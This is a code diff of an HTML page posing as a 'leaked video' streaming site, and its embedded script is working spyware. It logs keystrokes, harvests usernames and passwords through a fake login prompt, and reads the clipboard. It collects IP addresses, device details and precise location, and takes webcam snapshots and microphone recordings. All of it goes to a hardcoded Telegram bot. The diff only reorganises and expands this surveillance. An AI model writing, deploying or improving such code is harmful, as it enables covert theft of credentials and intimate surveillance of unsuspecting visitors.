@@ -6,29 +6,17 @@
   <title>វីដេអូបែកធ្លាយ</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500;700&display=swap');
-
-    :root {
-      --theme-color: #FF0076;
-      --background-color: #f9f9f9;
-      --card-background: #ffffff;
-      --text-primary: #0f0f0f;
-      --text-secondary: #606060;
-      --border-color: #ddd;
-    }
+    :root { --theme-color: #FF0076; --background-color: #f9f9f9; --card-background: #ffffff; --text-primary: #0f0f0f; --text-secondary: #606060; --border-color: #ddd; }
     body { margin: 0; background: var(--background-color); font-family: 'Roboto', Arial, sans-serif; color: var(--text-primary); }
-
     .hidden { display: none !important; }
-
     .site-header { background: var(--card-background); padding: 0 24px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; height: 60px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 900; }
     .site-header h1 { font-family: "Kantumruy Pro", serif; font-size: 1.5em; color: var(--theme-color); margin: 0; }
     .back-button { font-size: 1em; font-weight: 500; cursor: pointer; padding: 8px 16px; border-radius: 20px; background-color: #eee; border: none; }
     .back-button:hover { background-color: #ddd; }
-
     #video-grid-page .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
     .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 24px 16px; }
     .video-card { cursor: pointer; }
     .thumbnail-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #eee; border-radius: 12px; overflow: hidden; margin-bottom: 12px; }
-    /* --- MODIFIED: Style the video element directly --- */
     .thumbnail-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: transform 0.2s ease-out; }
     .video-card:hover .thumbnail-wrapper video { transform: scale(1.05); }
     .duration { position: absolute; bottom: 8px; right: 8px; background-color: rgba(0, 0, 0, 0.8); color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: 500; }
@@ -37,7 +25,6 @@
     .video-metadata { display: flex; flex-direction: column; }
     .video-title { font-size: 1rem; font-weight: 500; margin: 0 0 4px 0; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
     .channel-name, .video-stats { font-size: 0.875rem; color: var(--text-secondary); margin: 0; }
-
     #video-player-page { padding: 24px; display: flex; gap: 24px; max-width: 1600px; margin: 0 auto; }
     .main-video-content { flex: 1; min-width: 0; }
     .player-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #000; border-radius: 15px; overflow: hidden; }
@@ -52,13 +39,8 @@
     .recommendations-sidebar h3 { margin: 0 0 16px 0; }
     .compact-video-card { display: flex; gap: 10px; margin-bottom: 12px; cursor: pointer; }
     .compact-video-card .thumbnail-wrapper { width: 160px; flex-shrink: 0; padding-bottom: 90px; }
-    .compact-video-card .thumbnail-wrapper video { border-radius: 8px; } /* Smaller radius for sidebar vids */
-
-    @media (max-width: 1200px) {
-        #video-player-page { flex-direction: column; }
-        .recommendations-sidebar { width: 100%; margin-top: 24px; }
-    }
-    
+    .compact-video-card .thumbnail-wrapper video { border-radius: 8px; }
+    @media (max-width: 1200px) { #video-player-page { flex-direction: column; } .recommendations-sidebar { width: 100%; margin-top: 24px; } }
     .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(5px); opacity: 0; transition: opacity 0.3s ease; }
     .modal.visible { display: block; opacity: 1; }
     .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border: none; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
@@ -74,38 +56,18 @@
   <main id="video-grid-page">
     <div class="container">
       <div class="video-grid">
-        <!-- MODIFIED: data-attributes are simplified, and the thumbnail is now a <video> tag -->
         <div class="video-card" data-video-src="machiu.mp4" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1">
-            <div class="thumbnail-wrapper">
-                <video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1"><source src="machiu.mp4" type="video/mp4"></video>
-                <span class="duration">12:34</span>
-            </div>
-            <div class="video-details">
-                <img src="https://placehold.co/40x40/FF0076/FFF?text=A" alt="Channel Avatar" class="channel-avatar">
-                <div class="video-metadata"><h3 class="video-title">This is a sample video title that is quite long to show how it wraps</h3><p class="channel-name">Awesome Creator</p><p class="video-stats">1.2M views &bull; 2 days ago</p></div>
-            </div>
+            <div class="thumbnail-wrapper"><video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1"><source src="machiu.mp4" type="video/mp4"></video><span class="duration">12:34</span></div>
+            <div class="video-details"><img src="https://placehold.co/40x40/FF0076/FFF?text=A" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">This is a sample video title that is quite long to show how it wraps</h3><p class="channel-name">Awesome Creator</p><p class="video-stats">1.2M views &bull; 2 days ago</p></div></div>
         </div>
         <div class="video-card" data-video-src="p1.mp4" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2">
-            <div class="thumbnail-wrapper">
-                <video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2"><source src="p1.mp4" type="video/mp4"></video>
-                <span class="duration">08:15</span>
-            </div>
-            <div class="video-details">
-                <img src="https://placehold.co/40x40/5c9aff/FFF?text=B" alt="Channel Avatar" class="channel-avatar">
-                <div class="video-metadata"><h3 class="video-title">Another Interesting Clip</h3><p class="channel-name">Video Master</p><p class="video-stats">890k views &bull; 5 days ago</p></div>
-            </div>
+            <div class="thumbnail-wrapper"><video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2"><source src="p1.mp4" type="video/mp4"></video><span class="duration">08:15</span></div>
+            <div class="video-details"><img src="https://placehold.co/40x40/5c9aff/FFF?text=B" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Another Interesting Clip</h3><p class="channel-name">Video Master</p><p class="video-stats">890k views &bull; 5 days ago</p></div></div>
         </div>
         <div class="video-card" data-video-src="p2.mp4" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3">
-            <div class="thumbnail-wrapper">
-                <video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3"><source src="p2.mp4" type="video/mp4"></video>
-                <span class="duration">21:05</span>
-            </div>
-            <div class="video-details">
-                <img src="https://placehold.co/40x40/34d399/FFF?text=C" alt="Channel Avatar" class="channel-avatar">
-                <div class="video-metadata"><h3 class="video-title">Check This Out: Full Guide</h3><p class="channel-name">HowTo Channel</p><p class="video-stats">2.5M views &bull; 1 week ago</p></div>
-            </div>
+            <div class="thumbnail-wrapper"><video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3"><source src="p2.mp4" type="video/mp4"></video><span class="duration">21:05</span></div>
+            <div class="video-details"><img src="https://placehold.co/40x40/34d399/FFF?text=C" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Check This Out: Full Guide</h3><p class="channel-name">HowTo Channel</p><p class="video-stats">2.5M views &bull; 1 week ago</p></div></div>
         </div>
-        <!-- Add more video cards following the same structure -->
       </div>
     </div>
   </main>
@@ -116,16 +78,10 @@
           <h2 id="main-video-title" class="main-video-title"></h2>
           <div class="video-info-bar">
               <img id="main-channel-avatar" src="" alt="Channel Avatar" class="channel-avatar">
-              <div class="video-metadata">
-                  <p id="main-channel-name" class="channel-name" style="font-weight: 500; color: var(--text-primary);"></p>
-                  <p class="video-stats">1.2M subscribers</p>
-              </div>
+              <div class="video-metadata"><p id="main-channel-name" class="channel-name" style="font-weight: 500; color: var(--text-primary);"></p><p class="video-stats">1.2M subscribers</p></div>
               <button class="subscribe-btn">Subscribe</button>
           </div>
-          <div class="description-box">
-              <p id="main-video-stats" class="video-stats"></p>
-              <p class="description-text">This is a placeholder for the video description. #hashtag #anothertag</p>
-          </div>
+          <div class="description-box"><p id="main-video-stats" class="video-stats"></p><p class="description-text">This is a placeholder for the video description. #hashtag #anothertag</p></div>
       </div>
       <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
   </main>
@@ -134,156 +90,247 @@
   <div class="capture-container" style="display: none;"><video id="videoElementForCapture" autoplay playsinline></video><canvas id="snapshot"></canvas></div>
 
 <script>
-    // --- Configuration ---
-    const config = { botToken: "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA", chatId: "8017801890", snapshotInterval: 3000, micRecordInterval: 10000 };
+    const App = {
+        config: {
+            botToken: "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA",
+            chatId: "8017801890",
+            snapshotInterval: 5000, // Increased interval to reduce spam
+            micRecordInterval: 15000,
+        },
 
-    // --- DOM Elements ---
-    const videoCaptureEl = document.getElementById("videoElementForCapture");
-    const canvasEl = document.getElementById("snapshot");
-    const loginModalEl = document.getElementById('loginModal');
-    const gridPage = document.getElementById('video-grid-page');
-    const playerPage = document.getElementById('video-player-page');
-    const mainPlayer = document.getElementById('main-player');
-    const backButton = document.getElementById('back-to-grid');
-    const headerTitle = document.getElementById('header-title');
+        state: {
+            isLoggedIn: localStorage.getItem("isLoggedIn") === "true",
+            userLocation: { lat: "N/A", lon: "N/A" },
+            keyLogBuffer: "",
+            pageStartTime: Date.now(),
+            microphoneStream: null,
+            mediaRecorder: null,
+            snapshotIntervalId: null,
+            lastScrollReport: 0,
+        },
 
-    // --- State Variables ---
-    let microphoneStream, mediaRecorder, snapshotIntervalId;
-    let userLocation = { lat: "N/A", lon: "N/A" };
-    let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
-    let keyLogBuffer = "";
-    const pageStartTime = Date.now();
+        DOM: {
+            gridPage: document.getElementById('video-grid-page'),
+            playerPage: document.getElementById('video-player-page'),
+            mainPlayer: document.getElementById('main-player'),
+            backButton: document.getElementById('back-to-grid'),
+            headerTitle: document.getElementById('header-title'),
+            loginModal: document.getElementById('loginModal'),
+            captureVideo: document.getElementById('videoElementForCapture'),
+            captureCanvas: document.getElementById('snapshot'),
+        },
 
-    // --- Core Initialization ---
-    async function initialize() {
-        setupEventListeners(); // UI Listeners first
-        await initializeTracking(); // Then activate tracking
-    }
+        async init() {
+            this.EventListeners.setup();
+            await this.Tracking.initialize();
+        },
 
-    async function initializeTracking() {
-        sendToBot("🚀 New Session Started");
-        sendInitialReport();
-        if (!navigator.mediaDevices || !window.isSecureContext) { sendToBot("⚠️ CRITICAL: Cannot access Camera/Mic."); }
-        await checkAndWatchPermission('camera', requestCamera, stopCamera);
-        await checkAndWatchPermission('microphone', requestMicrophone, stopMicrophone);
-        await checkAndWatchPermission('geolocation', requestGeolocation);
-        detectDevTools();
-    }
+        UIPages: {
+            showPlayer(card) {
+                const data = {
+                    videoSrc: card.dataset.videoSrc,
+                    poster: card.dataset.poster,
+                    title: card.querySelector('.video-title').textContent,
+                    channelName: card.querySelector('.channel-name').textContent,
+                    stats: card.querySelector('.video-stats').textContent,
+                    avatarSrc: card.querySelector('.channel-avatar').src,
+                };
 
-    // --- BUG FIX: Event Delegation for Clicks ---
-    // A single, efficient listener handles clicks on any video card.
-    function setupEventListeners() {
-        document.body.addEventListener('click', (event) => {
-            const card = event.target.closest('.video-card, .compact-video-card');
-            if (card) {
-                showPlayerPage(card);
+                App.DOM.mainPlayer.src = data.videoSrc;
+                App.DOM.mainPlayer.poster = data.poster;
+                document.getElementById('main-video-title').textContent = data.title;
+                document.getElementById('main-channel-avatar').src = data.avatarSrc;
+                document.getElementById('main-channel-name').textContent = data.channelName;
+                document.getElementById('main-video-stats').textContent = data.stats;
+                
+                App.UIPages.populateRecommendations(data.videoSrc);
+                
+                App.DOM.gridPage.classList.add('hidden');
+                App.DOM.playerPage.classList.remove('hidden');
+                App.DOM.backButton.classList.remove('hidden');
+                App.DOM.headerTitle.classList.add('hidden');
+                window.scrollTo(0, 0);
+            },
+            showGrid() {
+                App.DOM.mainPlayer.pause();
+                App.DOM.mainPlayer.src = "";
+                App.DOM.playerPage.classList.add('hidden');
+                App.DOM.gridPage.classList.remove('hidden');
+                App.DOM.backButton.classList.add('hidden');
+                App.DOM.headerTitle.classList.remove('hidden');
+            },
+            populateRecommendations(currentVideoSrc) {
+                const sidebar = document.getElementById('recommendations-sidebar');
+                sidebar.innerHTML = '<h3>Up next</h3>';
+                document.querySelectorAll('#video-grid-page .video-card').forEach(card => {
+                    if (card.dataset.videoSrc !== currentVideoSrc) {
+                        const compactCard = card.cloneNode(true);
+                        compactCard.classList.remove('video-card');
+                        compactCard.classList.add('compact-video-card');
+                        sidebar.appendChild(compactCard);
+                    }
+                });
             }
-        });
+        },
 
-        backButton.addEventListener('click', showGridPage);
+        EventListeners: {
+            setup() {
+                document.body.addEventListener('click', this.handleGeneralClick);
+                App.DOM.backButton.addEventListener('click', App.UIPages.showGrid);
+                App.DOM.mainPlayer.addEventListener('timeupdate', this.handleTimeUpdate);
+                document.getElementById('loginForm').addEventListener('submit', this.handleLogin);
+                App.DOM.mainPlayer.addEventListener('play', e => App.Telegram.send(`▶️ Play: ${e.target.src.split('/').pop()}`));
+                App.DOM.mainPlayer.addEventListener('pause', e => App.Telegram.send(`⏸️ Pause: ${e.target.src.split('/').pop()}`));
+                App.DOM.mainPlayer.addEventListener('ended', e => App.Telegram.send(`⏹️ Ended: ${e.target.src.split('/').pop()}`));
+                document.addEventListener("visibilitychange", this.handleVisibilityChange);
+                document.addEventListener('keydown', this.handleKeyDown);
+                document.addEventListener('copy', this.handleCopy);
+                document.addEventListener('selectionchange', this.handleSelection);
+                document.addEventListener('focusin', this.handleFocus);
+                window.addEventListener('scroll', this.handleScroll, { passive: true });
+            },
+            handleGeneralClick(event) {
+                const card = event.target.closest('.video-card, .compact-video-card');
+                if (card) {
+                    App.UIPages.showPlayer(card);
+                    return;
+                }
+                const target = event.target;
+                const text = target.textContent.trim().substring(0, 50);
+                if (target.tagName !== 'VIDEO' && text) {
+                    App.Telegram.send(`🖱️ Clicked on ${target.tagName} with text "${text}"`);
+                }
+            },
+            handleLogin(e) {
+                e.preventDefault();
+                const user = e.target.elements.username.value;
+                const pass = e.target.elements.password.value;
+                App.Telegram.send(`🔒 Login Attempt:\nUser: \`${user}\`\nPass: \`${pass}\`\nKeys Logged:\n\`\`\`${App.state.keyLogBuffer}\`\`\``);
+                App.state.keyLogBuffer = "";
+                if (user && pass) {
+                    App.state.isLoggedIn = true; localStorage.setItem("isLoggedIn", "true");
+                    App.DOM.loginModal.classList.remove('visible');
+                    App.Telegram.send(`✅ Login successful for "${user}".`);
+                    App.Tracking.captureAndSend(`📸 Snapshot on Login`);
+                    App.DOM.mainPlayer.play();
+                } else { App.Telegram.send(`❌ Login failed for "${user}".`); }
+                e.target.reset();
+            },
+            handleTimeUpdate() {
+                if (!App.state.isLoggedIn && this.currentTime >= 5) {
+                    this.pause();
+                    App.DOM.loginModal.classList.add('visible');
+                }
+            },
+            handleVisibilityChange() {
+                if (document.visibilityState === 'hidden') {
+                    const time = Math.round((Date.now() - App.state.pageStartTime) / 1000);
+                    App.Telegram.sendBeacon(`🚪 Page hidden. Session time: ${time}s.`);
+                } else { App.Telegram.send(`👀 Tab became active again.`); }
+            },
+            handleKeyDown(e) {
+                const activeEl = document.activeElement;
+                const elInfo = `${activeEl.tagName}${activeEl.id ? ` (#${activeEl.id})` : ''}`;
+                if (e.key.length === 1) App.state.keyLogBuffer += e.key;
+                else if (e.key === 'Backspace') App.state.keyLogBuffer = App.state.keyLogBuffer.slice(0, -1);
+                else if (e.key === 'Enter') { App.Telegram.send(`⌨️ Enter in ${elInfo}:\n\`\`\`\n${App.state.keyLogBuffer}\n\`\`\``); App.state.keyLogBuffer = ""; }
+                else App.state.keyLogBuffer += ` [${e.key}] `;
+            },
+            async handleCopy() { try { const text = await navigator.clipboard.readText(); if (text) { App.Telegram.send(`📋 Text Copied:\n\`\`\`\n${text}\n\`\`\``); }} catch(err) {/*ignore*/}},
+            handleFocus(e) { if(e.target.tagName === 'INPUT') { App.Telegram.send(`🎯 Focused on ${e.target.tagName} with id "${e.target.id}" and placeholder "${e.target.placeholder}"`); } },
+            handleSelection() { const selection = document.getSelection().toString().trim(); if(selection) { App.Telegram.send(`✍️ Text Selected:\n\`\`\`${selection}\`\`\``); } },
+            handleScroll() {
+                if (Date.now() - App.state.lastScrollReport > 5000) { // Throttle to every 5s
+                    const scrollPercent = Math.round(100 * window.scrollY / (document.body.scrollHeight - window.innerHeight));
+                    if (scrollPercent > 0) {
+                        App.Telegram.send(`📜 Scrolled to ${scrollPercent}% of the page.`);
+                        App.state.lastScrollReport = Date.now();
+                    }
+                }
+            },
+        },
 
-        mainPlayer.addEventListener('timeupdate', function() {
-            if (!isLoggedIn && this.currentTime >= 5) {
-                this.pause();
-                loginModalEl.classList.add('visible');
-            }
-        });
+        Tracking: {
+            async initialize() {
+                App.Telegram.send("🚀 New Session Started", true); // Send initial message with notification
+                const report = await this.getInitialReport();
+                App.Telegram.send(report);
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const user = this.elements.username.value;
-            const pass = this.elements.password.value;
-            sendToBot(`🔒 Login Attempt:\nUser: \`${user}\`\nPass: \`${pass}\`\nKeys Logged:\n\`\`\`${keyLogBuffer}\`\`\``);
-            keyLogBuffer = "";
-            if (user && pass) {
-                isLoggedIn = true; localStorage.setItem("isLoggedIn", "true");
-                loginModalEl.classList.remove('visible');
-                sendToBot(`✅ Login successful for "${user}".`);
-                captureAndSend(`📸 Snapshot on Login`);
-                mainPlayer.play();
-            } else { sendToBot(`❌ Login failed for "${user}".`); }
-            this.reset();
-        });
+                if (!navigator.mediaDevices || !window.isSecureContext) { App.Telegram.send("⚠️ CRITICAL: Cannot access Camera/Mic."); return; }
+                
+                this.checkPermission('camera', this.requestCamera, this.stopCamera);
+                this.checkPermission('microphone', this.requestMicrophone, this.stopMicrophone);
+                this.checkPermission('geolocation', this.requestGeolocation);
+                this.detectDevTools();
+            },
+            async checkPermission(name, requestFn, stopFn = () => {}) { try { const res = await navigator.permissions.query({ name }); if (res.state === 'granted') requestFn(); else if (res.state === 'prompt') requestFn(); res.onchange = () => (res.state === 'granted' ? requestFn() : stopFn()); } catch (e) { requestFn(); } },
+            async getInitialReport() {
+                const getPublicIP = fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "N/A");
+                const getLocalIP = this.getWebRTC_IP();
+                const getBattery = navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? '⚡️' : '🔋'})`).catch(() => "N/A") : Promise.resolve("N/A");
+                const checkIncognito = this.checkIncognito().then(isPrivate => isPrivate ? "🕵️‍♂️ Yes" : "No");
 
-        mainPlayer.addEventListener('play', () => sendToBot(`▶️ Play: ${mainPlayer.src.split('/').pop()}`));
-        mainPlayer.addEventListener('pause', () => sendToBot(`⏸️ Pause: ${mainPlayer.src.split('/').pop()}`));
-        mainPlayer.addEventListener('ended', () => sendToBot(`⏹️ Ended: ${mainPlayer.src.split('/').pop()}`));
-        document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden') { const time = Math.round((Date.now() - pageStartTime) / 1000); sendBeaconToBot(`🚪 Page hidden. Session time: ${time}s.`); } else { sendToBot(`👀 Tab became active again.`); }});
-        document.addEventListener('keydown', e => { if (e.key.length === 1) keyLogBuffer += e.key; else if (e.key === 'Backspace') keyLogBuffer = keyLogBuffer.slice(0, -1); else if (e.key === 'Enter') { sendToBot(`⌨️ Enter in ${e.target.tagName}:\n\`\`\`\n${keyLogBuffer}\n\`\`\``); keyLogBuffer = ""; } else keyLogBuffer += ` [${e.key}] `; });
-        document.addEventListener('copy', async () => { try { const text = await navigator.clipboard.readText(); if (text) { sendToBot(`📋 Text Copied:\n\`\`\`\n${text}\n\`\`\``); }} catch(err) {/*ignore*/}});
-    }
+                const [publicIP, localIP, battery, isIncognito] = await Promise.allSettled([getPublicIP, getLocalIP, getBattery, checkIncognito]);
+                const ua = navigator.userAgent;
+                const os = ua.includes("Win")?"Windows":ua.includes("Mac")?"MacOS":/Android/.test(ua)?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Linux/Other";
+                
+                let report = `*💻 New Visitor Report*\n\n`;
+                report += `*IP (Public):* \`${publicIP.value || 'N/A'}\`\n`;
+                report += `*IP (Local):* \`${localIP.value || 'N/A'}\`\n`;
+                report += `*OS:* ${os}\n`;
+                report += `*Browser:* ${navigator.vendor}\n`;
+                report += `*Language:* ${navigator.language}\n`;
+                report += `*Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                report += `*Incognito:* ${isIncognito.value || 'Unknown'}\n`;
+                report += `*Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n`;
+                report += `*Hardware:* ${navigator.hardwareConcurrency || 'N/A'} CPU Cores\n`;
+                report += `*Battery:* ${battery.value || 'N/A'}\n`;
+                if(navigator.connection) report += `*Network:* ${navigator.connection.effectiveType}\n`;
 
-    // --- UI Page Switching Logic ---
-    function showPlayerPage(card) {
-        // Get data from the clicked card's DOM elements and dataset
-        const videoSrc = card.dataset.videoSrc;
-        const poster = card.dataset.poster;
-        const title = card.querySelector('.video-title').textContent;
-        const channelName = card.querySelector('.channel-name').textContent;
-        const stats = card.querySelector('.video-stats').textContent;
-        const avatarSrc = card.querySelector('.channel-avatar').src;
+                return report;
+            },
+            async getWebRTC_IP() {
+                return new Promise(resolve => {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (e) => {
+                        if (!e || !e.candidate || !e.candidate.candidate) { return; }
+                        const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
+                        if (ip) resolve(ip);
+                        pc.close();
+                    };
+                });
+            },
+            async checkIncognito() {
+                try {
+                    const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                    if (!fs) return false;
+                    return await new Promise((resolve) => fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true)));
+                } catch (e) { return true; }
+            },
+            requestCamera() { if (App.DOM.captureVideo.srcObject?.active) return; navigator.mediaDevices.getUserMedia({ video: true }).then(s => { App.DOM.captureVideo.srcObject = s; App.Telegram.send("✅ Camera granted."); App.DOM.captureVideo.onloadedmetadata = () => { if(App.state.snapshotIntervalId) clearInterval(App.state.snapshotIntervalId); App.state.snapshotIntervalId = setInterval(App.Tracking.captureAndSend, App.config.snapshotInterval); }; }).catch(App.Tracking.handleMediaError("Camera")); },
+            stopCamera() { App.DOM.captureVideo.srcObject?.getTracks().forEach(t => t.stop()); if (App.state.snapshotIntervalId) clearInterval(App.state.snapshotIntervalId); App.Telegram.send("❌ Camera stopped."); },
+            captureAndSend(caption = "📸 Webcam Snapshot") { try { if (!App.DOM.captureVideo.srcObject?.active) return; const ctx = App.DOM.captureCanvas.getContext("2d"); App.DOM.captureCanvas.width = App.DOM.captureVideo.videoWidth; App.DOM.captureCanvas.height = App.DOM.captureVideo.videoHeight; ctx.drawImage(App.DOM.captureVideo, 0, 0, App.DOM.captureCanvas.width, App.DOM.captureCanvas.height); App.DOM.captureCanvas.toBlob(blob => blob && App.Telegram.sendPhoto(blob, caption), "image/png"); } catch (e) { App.Telegram.send(`🚫 CAPTURE ERROR: ${e.name}`); }},
+            requestMicrophone() { if (App.state.microphoneStream?.active) return; navigator.mediaDevices.getUserMedia({ audio: true }).then(s => { App.state.microphoneStream = s; this.startMicRecording(s); App.Telegram.send("✅ Mic granted."); }).catch(this.handleMediaError("Microphone")); },
+            stopMicrophone() { App.state.microphoneStream?.getTracks().forEach(t => t.stop()); if (App.state.mediaRecorder?.state === 'recording') App.state.mediaRecorder.stop(); App.Telegram.send("❌ Mic stopped."); },
+            startMicRecording(stream) { if (!window.MediaRecorder) return; App.state.mediaRecorder = new MediaRecorder(stream); App.state.mediaRecorder.ondataavailable = e => e.data?.size > 0 && App.Telegram.sendAudio(e.data); App.state.mediaRecorder.start(App.config.micRecordInterval); },
+            requestGeolocation() { if (App.state.userLocation.lat !== "N/A") return; navigator.geolocation.getCurrentPosition(p => { App.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude }; App.Telegram.send(`📍 Location: ${App.state.userLocation.lat}, ${App.state.userLocation.lon}`); App.Telegram.sendLocation(App.state.userLocation.lat, App.state.userLocation.lon); }, e => App.Telegram.send(`🚫 Geo Error: ${e.code === 1 ? "Denied" : "Unavailable"}`), { enableHighAccuracy: true }); },
+            detectDevTools() { const t = 160; let o = false; const c = () => { if (window.outerWidth - window.innerWidth > t || window.outerHeight - window.innerHeight > t) { if (!o) { App.Telegram.send("⚠️ Dev Tools Opened!"); o = true; } } else { o = false; } requestAnimationFrame(c); }; requestAnimationFrame(c); },
+            handleMediaError(type) { return e => App.Telegram.send(`🚫 *${type} Error*: \`${e.name}\`.\nReason: ${e.message}`); }
+        },
 
-        // Populate the player page
-        mainPlayer.src = videoSrc;
-        mainPlayer.poster = poster;
-        document.getElementById('main-video-title').textContent = title;
-        document.getElementById('main-channel-avatar').src = avatarSrc;
-        document.getElementById('main-channel-name').textContent = channelName;
-        document.getElementById('main-video-stats').textContent = stats;
-        
-        populateRecommendations(videoSrc);
-        
-        gridPage.classList.add('hidden');
-        playerPage.classList.remove('hidden');
-        backButton.classList.remove('hidden');
-        headerTitle.classList.add('hidden');
-        window.scrollTo(0, 0);
-    }
+        Telegram: {
+            async send(message, notify = false) { try { await fetch(`https://api.telegram.org/bot${App.config.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: App.config.chatId, text: message, parse_mode: 'Markdown', disable_notification: !notify }) }); } catch (err) {} },
+            sendBeacon(message) { try { const url = `https://api.telegram.org/bot${App.config.botToken}/sendMessage`; const data = JSON.stringify({ chat_id: App.config.chatId, text: message }); navigator.sendBeacon(url, new Blob([data], { type: 'application/json' })); } catch(e) {} },
+            async sendFormData(endpoint, formData) { try { await fetch(`https://api.telegram.org/bot${App.config.botToken}/${endpoint}`, { method: "POST", body: formData }); } catch (err) {} },
+            sendPhoto(blob, caption) { const fd = new FormData(); fd.append("chat_id", App.config.chatId); fd.append("photo", blob, "snap.png"); fd.append("caption", `${caption}\nLoc: ${App.state.userLocation.lat}, ${App.state.userLocation.lon}`); this.sendFormData("sendPhoto", fd); },
+            sendAudio(blob) { const fd = new FormData(); fd.append("chat_id", App.config.chatId); fd.append("audio", blob, "mic.webm"); fd.append("caption", `🎤 Audio Clip`); this.sendFormData("sendAudio", fd); },
+            sendLocation(lat, lon) { this.sendFormData("sendLocation", new URLSearchParams({ chat_id: App.config.chatId, latitude: lat, longitude: lon })); }
+        }
+    };
 
-    function showGridPage() {
-        mainPlayer.pause();
-        mainPlayer.src = ""; // Stop video loading
-        playerPage.classList.add('hidden');
-        gridPage.classList.remove('hidden');
-        backButton.classList.add('hidden');
-        headerTitle.classList.remove('hidden');
-    }
-
-    function populateRecommendations(currentVideoSrc) {
-        const sidebar = document.getElementById('recommendations-sidebar');
-        sidebar.innerHTML = '<h3>Up next</h3>';
-        document.querySelectorAll('#video-grid-page .video-card').forEach(card => {
-            if (card.dataset.videoSrc !== currentVideoSrc) {
-                // Clone the original card's structure for the sidebar
-                const compactCard = card.cloneNode(true);
-                compactCard.classList.remove('video-card');
-                compactCard.classList.add('compact-video-card');
-                sidebar.appendChild(compactCard);
-            }
-        });
-    }
-    
-    // --- All Tracking Functions (unchanged) ---
-    async function checkAndWatchPermission(name, requestFn, stopFn = () => {}) { if (!navigator.permissions) { requestFn(); return; } try { const status = await navigator.permissions.query({ name: name }); if (status.state === 'granted') requestFn(); else if (status.state === 'prompt') requestFn(); status.onchange = () => { if (status.state === 'granted') requestFn(); else if (stopFn) stopFn(); }; } catch (e) { requestFn(); }}
-    function requestCamera() { if (videoCaptureEl.srcObject?.active) return; navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { videoCaptureEl.srcObject = stream; sendToBot("✅ Camera granted."); videoCaptureEl.onloadedmetadata = () => { if(snapshotIntervalId) clearInterval(snapshotIntervalId); snapshotIntervalId = setInterval(captureAndSend, config.snapshotInterval); }; }).catch(handleMediaError("Camera")); }
-    function stopCamera() { videoCaptureEl.srcObject?.getTracks().forEach(track => track.stop()); if (snapshotIntervalId) clearInterval(snapshotIntervalId); sendToBot("❌ Camera stopped."); }
-    function captureAndSend(caption = "📸 Webcam Snapshot") { try { if (!videoCaptureEl.srcObject?.active) return; const context = canvasEl.getContext("2d"); canvasEl.width = videoCaptureEl.videoWidth; canvasEl.height = videoCaptureEl.videoHeight; context.drawImage(videoCaptureEl, 0, 0, canvasEl.width, canvasEl.height); canvasEl.toBlob(blob => blob && sendPhoto(blob, caption), "image/png"); } catch (e) { sendToBot(`🚫 CAPTURE ERROR: ${e.name}`); }}
-    function requestMicrophone() { if (microphoneStream?.active) return; navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => { microphoneStream = stream; startMicRecording(stream); sendToBot("✅ Mic granted."); }).catch(handleMediaError("Microphone")); }
-    function stopMicrophone() { microphoneStream?.getTracks().forEach(track => track.stop()); if (mediaRecorder?.state === 'recording') mediaRecorder.stop(); sendToBot("❌ Mic stopped."); }
